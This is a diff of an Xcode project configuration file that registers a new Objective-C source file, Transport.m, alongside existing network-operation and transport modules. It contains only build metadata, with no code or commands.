@@ -34,6 +34,7 @@
 		1A4436590F8CD55400CD910E /* RCSMCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4436580F8CD55400CD910E /* RCSMCommon.m */; };
 		1A508A9D11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A508A9C11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m */; };
 		1A508B0511A6B1F20067BF81 /* Carbon.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A508B0411A6B1F20067BF81 /* Carbon.framework */; };
+		1A5B320D12E4A2AF00677A0B /* Transport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A5B320C12E4A2AF00677A0B /* Transport.m */; };
 		1A65115812DDC99100D4F1AF /* IDNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115712DDC99100D4F1AF /* IDNetworkOperation.m */; };
 		1A65115B12DDC9B500D4F1AF /* ConfNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115A12DDC9B500D4F1AF /* ConfNetworkOperation.m */; };
 		1A65115E12DDC9E200D4F1AF /* DownloadNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A65115D12DDC9E200D4F1AF /* DownloadNetworkOperation.m */; };
@@ -140,6 +141,7 @@
 		1A508A9C11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSMutableDictionary+ThreadSafe.m"; path = "Categories/NSMutableDictionary+ThreadSafe.m"; sourceTree = "<group>"; };
 		1A508AD111A692260067BF81 /* RCSMDesktopImage.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMDesktopImage.h; sourceTree = "<group>"; };
 		1A508B0411A6B1F20067BF81 /* Carbon.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Carbon.framework; path = System/Library/Frameworks/Carbon.framework; sourceTree = SDKROOT; };
+		1A5B320C12E4A2AF00677A0B /* Transport.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = Transport.m; path = Modules/Transport.m; sourceTree = "<group>"; };
 		1A65115612DDC99100D4F1AF /* IDNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = IDNetworkOperation.h; path = Modules/IDNetworkOperation.h; sourceTree = "<group>"; };
 		1A65115712DDC99100D4F1AF /* IDNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = IDNetworkOperation.m; path = Modules/IDNetworkOperation.m; sourceTree = "<group>"; };
 		1A65115912DDC9B500D4F1AF /* ConfNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = ConfNetworkOperation.h; path = Modules/ConfNetworkOperation.h; sourceTree = "<group>"; };
@@ -308,6 +310,7 @@
 			isa = PBXGroup;
 			children = (
 				1A40F7DF12DF107900BEACB8 /* Transport.h */,
+				1A5B320C12E4A2AF00677A0B /* Transport.m */,
 				1A40F81612DF293A00BEACB8 /* RESTTransport.h */,
 				1A40F81712DF293A00BEACB8 /* RESTTransport.m */,
 			);
@@ -657,6 +660,7 @@
 				1A65116A12DDCA6C00D4F1AF /* ByeNetworkOperation.m in Sources */,
 				1A40F7C912DF071C00BEACB8 /* AuthNetworkOperation.m in Sources */,
 				1A40F81812DF293A00BEACB8 /* RESTTransport.m in Sources */,
+				1A5B320D12E4A2AF00677A0B /* Transport.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
